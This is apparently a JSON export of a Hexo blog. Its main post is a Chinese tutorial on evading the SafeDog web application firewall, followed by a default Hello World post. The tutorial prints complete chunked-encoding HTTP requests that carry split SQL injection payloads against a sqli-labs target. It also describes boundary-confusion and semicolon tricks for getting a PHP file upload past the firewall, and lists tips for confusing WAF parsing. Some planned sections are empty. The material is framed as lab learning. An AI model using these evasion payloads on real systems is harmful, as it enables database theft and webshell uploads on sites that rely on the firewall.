[{"id":"55569e11a71c2cbe7d64e1aa9885d18a","title":"test1","content":"0x01 前言某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。\n某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。\n\n环境的搭建：环境的搭建就选择phpstudy2018+安全狗最新版(2022年10月23日前)\nTip：\n  （1）记得先在phpstudy的Apache的bin目录下初始化Apache服务，一般来说，第一次为询问是否确认，第二次为确认安装（命令：httpd.exe -k install -n apache2.4  用管理员打开）\n  （2）上传防护中把完整的post包过滤勾选上。\n\n0x02 HTTP补充：分块传输的介绍：分块传输编码是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器向客户端发送的数据分成多个部分，在消息头中指定 Transfer-Encoding: chunked 就表示整个response将使分块传输编译来传输内容。一个消息块由n块组成，并在最后一个大小为0的块结束。\n请求头Transfer-encoding：官方文档:\n告知接收方为了可靠地传输报文，已经对其进行了何种编码。\n\nchunked编码，使用若干个chunk串连接而成，由一个标明长度为0的chunk表示解释，每个chunk分为头部和正文两部分，头部内容定义了下一行传输内容的个数（个数用16进制来进行表示）和数量（一般不写数量，但是为了混淆，这里还是把数量写上去）正文部分就是指定长度的实际内容。两部分之间用(CRLF)来隔开，在最后一个长度为0的chunk中表示结束。并且长度中是以;作为长度的结束\n数据包中添加：Transfer-Encoding: chunked\n数字代表下一行的字符所占位数，最后需要用0独占一行表示结束，结尾需要两个回车\n\n当设置这个Transfer-Encoding请求头的时候，会有两个效果：\nContent-length字段自动忽略\n基于长久化持续推送动态内容（不太了解，但是第三感觉有研究内容）\n\n\nHTTP持久化连接：因为现在大多数是http1.1协议版本，所以的话，只在Transfer-Encoding中定义了chunked一种编码格式。\n持久化连接：\n  Http请求是运行在TCP连接上的，所以自然有TCP的三次握手和四次挥手，慢启动的问题，所以为了提高http的性能，就使用了持久化连接。持久化连接在《计算机网络》中有提及。\n\n  在Http1.1的版本中规定了所有连接默认都是持久化连接，除非在请求头上加上Connection：close。来关闭持久化连接。\n\nContent-Type介绍：Content-Type：互联网媒体类型， 也叫MIME类型，在HTTP的协议消息头中，使用Content-Type来表示请求和响应中的媒体数据格式标签，用于区分数据类型。常见Content-Type的格式如下：\nContent-Type: text/html;\nContent-Type: application/json;charset:utf-8;\nContent-Type：type/subtype ;parameter\nContent-Type：application/x-www-form-urlencoded\nContent-Type：multipart/form-data\n\n重点介绍multipart&#x2F;form-data：当服务器使用multipart&#x2F;form-data接收POST请求的时候，服务器如何知道开始位置和结束位置的呢？？？其中就是用了boundary边界来进行操作的。\nwaf绕过的思路：正常传输的payload都是可以被waf的正则匹配到的，而进行分块传输之后的payload，waf的正则不会进行匹配，而又满足http的规则，所以就能绕过waf。\n例如：正常传输过程中是这样的。那分块传输之后，就变成了这样。\nPOST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 128\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n4\nunam\n1\ne\n1\n=\n4\nadmi\n1\nn\n1\n&amp;\n4\npass\n2\nwd\n1\n=\n4\nadmi\n1\nn\n1\n&amp;\n4\nsubm\n2\nit\n1\n=\n4\nSubm\n2\nit\n0\n\n\n说明是可以识别分块传输的东西，那么我们就可以构造payload来看是否可以绕过waf。\n绕过安全狗的sql注入：这里先解决一下绕过安全狗的方式，在常见的方式中，我们都采用垃圾字符填充的方式来绕过安全狗，虽然效果很好，但是较为复杂，也容易出现被狗咬伤的情况，所以为了解决这一现状，小秦同学翻阅之后发现了分块传输的方式来绕过安全狗。但是分块传输目前来看只能适用于post请求。get请求还是比较难说。\n以sql-labs为例：在sqli-labs的第十一关，我们发现了可以用post请求。先正常看看过滤哪些字符，这里开门见山，直接把’union select (database()),2#。这个东西进行了过滤咱们可以尝试使用分块传输的方式来进行绕过。这里在请求头中添加。\nTransfer-Encoding: chunked\n这个东西，然后进行分块即可。\n\n读取数据库名POST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 251\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n1\nu\n4\nname\n1\n=\n1\n&amp;\n2\npa\n4\nsswd\n1\n=\n3\n%27\n2\nun\n1\ni\n2\non\n1\n+\n2\nse\n1\nl\n2\nec\n1\nt\n1\n+\n3\n%28\n2\nda\n1\nt\n2\nab\n1\na\n2\nse\n3\n%28\n3\n%29\n3\n%29\n3\n%2C\n1\n2\n3\n%23\n1\n&amp;\n3\nsub\n3\nmit\n1\n=\n3\nSub\n3\nmit\n0\n\n\n读取表名：POST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 619\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n1\nu\n2\nna\n1\nm\n1\ne\n1\n=\n1\n&amp;\n2\npa\n2\nss\n2\nwd\n1\n=\n3\n%27\n1\nu\n2\nni\n1\no\n1\nn\n1\n+\n2\nse\n2\nle\n1\nc\n1\nt\n1\n+\n3\n%28\n2\nse\n1\nl\n1\ne\n2\nct\n1\n+\n2\ngr\n2\nou\n1\np\n1\n_\n2\nco\n2\nnc\n2\nat\n3\n%28\n2\nta\n2\nbl\n1\ne\n1\n_\n2\nna\n2\nme\n3\n%29\n1\n+\n2\nfr\n2\nom\n1\n+\n2\nin\n2\nfo\n1\nr\n3\nmat\n2\nio\n1\nn\n1\n_\n2\nsc\n3\nhem\n1\na\n1\n.\n2\nta\n2\nbl\n2\nes\n1\n+\n2\nwh\n2\ner\n1\ne\n1\n+\n2\nta\n2\nbl\n1\ne\n1\n_\n2\nsc\n2\nhe\n1\nm\n1\na\n3\n%3D\n2\nda\n1\nt\n2\nab\n3\nase\n3\n%28\n3\n%29\n3\n%29\n3\n%2C\n1\n2\n3\n%23\n1\n&amp;\n2\nsu\n3\nbmi\n1\nt\n1\n=\n2\nSu\n4\nbmit\n0\n\n\n读列名：\n读取数据：\n绕过安全狗的文件上传（以pikachu靶场为例这里上面讲到了分块传输，这里直接先使用分块传输来进行绕过。这里讲下计算方式，因为文件上传不像sql注入那样单行，所以文件上传是会有回车和空格的计算，（一个回车和一个空格占两个字符）。例如下图：红框中的部分，分别处于不同的行，所以需要传入回车，所以这部分就应该是：这块先去上传php文件为例，可以进行分块传输的构造。然后上传。发现单单的分块传输已经不能绕过安全狗文件上传的检测了。\nContent-Type中的boundary边界混淆绕过因为上面讲到了Content-Type类型，那么对于我们来说，文件上传一定是利用了Content-Type中的multipart&#x2F;form-data来进行的文件上传操作，刚才讲到了利用multipart&#x2F;form-data必须用boundary边界来进行限制，那么我们这里研究一下boundary边界的一些问题。\n深入研究boundary边界问题：这里拿上面的边界来做文章，这里看到了，当上面定义了boundary&#x3D;—-WFJAFAOKAJNFKLAJ的时候我想到了两个问题。\n1.如果有两个boundary是取前一个还是后一个？\n2.boundary结束标志必须和定义的一定相同嘛？\n\n下面继续一一测试\n\nboundary边界问题fuzz：boundary边界一致：\nboundary结束标志不一致：\nboundary开始标志不一致：上面经过研究可以发现boundary结束标志不影响判断。\n多个boundary：\n所以当定义两个boundary的时候，只有第一个起作用。经过了上面的测试发现，我们可以通过构造多个boundary和修改boundary结束标志来达到混淆的效果，这里进行测试。\n多个boundary混淆：这里进入uploads&#x2F;1.php查看\n成功绕过waf。\n发现：这里发现，其他不用非得加boundary混淆，测到boundary后面加分号就直接可以绕过安全狗来上传成功。\n对于分块传输的小Tip：(1)分块传输的每个长度以;结尾，所以可以构造1;fjaojafjao这种来干扰waf\n(2)分块传输的时候是不会管Content-Length的长度，所以可以通过Content-Length的长度变换来绕过某些waf\n(3)分块传输只是适用于post请求，这也是存在的弊端问题\n\n总结：绕过waf的方式多种多样，但是越简单的方式越需要底层的探索，所以底层的学习是非常必要的。希望给正在学习绕waf的小伙伴提供一些思路。而不仅限于垃圾字符填充。\n参考文献：https://zhuanlan.zhihu.com/p/465948117\nhttp://t.zoukankan.com/liujizhou-p-11802189.html\nhttps://copyfuture.com/blogs-details/202203261638435585\n\n","slug":"test1","date":"2023-05-24T02:37:22.000Z","categories_index":"","tags_index":"安全","author_index":"Q16G"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2023-05-24T02:14:54.584Z","categories_index":"","tags_index":"","author_index":"Q16G"}]